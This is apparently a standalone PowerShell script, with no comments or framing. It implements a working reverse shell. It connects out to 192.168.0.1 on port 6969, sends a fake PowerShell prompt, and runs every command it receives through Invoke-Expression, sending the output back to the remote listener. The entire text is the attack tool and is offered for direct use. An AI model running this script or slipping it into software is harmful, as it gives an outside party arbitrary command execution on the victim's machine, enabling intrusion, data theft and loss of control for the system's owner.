$ip = "192.168.0.1"
$port = 6969

$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$greeting = "PS " + (Get-Location).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($greeting)
$stream.Write($sendbyte, 0, $sendbyte.Length);
$stream.Flush();
[byte[]]$bytes = 0..255 |% {0};

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (Invoke-Expression $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
};

$client.Close()